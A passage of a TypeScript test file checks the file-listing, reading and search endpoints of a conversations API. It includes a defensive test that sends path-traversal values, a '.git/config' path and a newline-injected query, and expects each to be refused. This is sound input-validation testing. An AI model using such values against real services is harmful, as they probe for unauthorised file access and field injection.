      new Request("http://i.inc/api/conversations", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ employeeId: "ada", project: "fintrack" }),
      }),
    );
    const id = ((await res.json()) as { conversation: { id: string } }).conversation.id;
    const get = async (path: string) => {
      const r = await a.handle(new Request(`http://i.inc/api/conversations/${path}`));
      return { status: r.status, body: (await r.json()) as Record<string, never> };
    };
    return { id, get };
  }

  it("answers 404 for a conversation that isn't there", async () => {
    const { get } = await app(demoReview);
    for (const p of ["files", "files/read?path=a.txt", "files/search?q=a"]) {
      expect((await get(`nope/${p}`)).status).toBe(404);
    }
  });

  it("lists, reads and searches the demo", async () => {
    const { id, get } = await app(demoReview);
    const { body: list } = await get(`${id}/files`);
    expect(list.files).toMatchObject({ state: "ok", noProject: false });
    expect((list.files as unknown as { paths: string[] }).paths).toContain("src/format.ts");
    const { body: read } = await get(`${id}/files/read?path=src%2Findex.ts`);
    expect(read.file).toMatchObject({ state: "ok", path: "src/index.ts", side: { state: "text" } });
    const { body: found } = await get(`${id}/files/search?q=MONEY`);
    expect((found.search as unknown as { hits: unknown[] }).hits.length).toBeGreaterThan(0);
    const { body: exact } = await get(`${id}/files/search?q=MONEY&case=1`);
    expect(exact.search).toMatchObject({ state: "ok", hits: [] });
  });

  it("refuses a bad path or query before anything reaches the machine", async () => {
    let asked = 0;
    const count = () => {
      asked++;
      return Promise.reject(new Error("asked"));
    };
    const { id, get } = await app(stub({ read: count, search: count }));
    expect((await get(`${id}/files/read`)).status).toBe(400);
    expect((await get(`${id}/files/read?path=..%2Fx`)).status).toBe(400);
    expect((await get(`${id}/files/read?path=.git%2Fconfig`)).status).toBe(400);
    expect((await get(`${id}/files/search`)).status).toBe(400);
    expect((await get(`${id}/files/search?q=a%0Ab`)).status).toBe(400);
    expect(asked).toBe(0);
  });
});
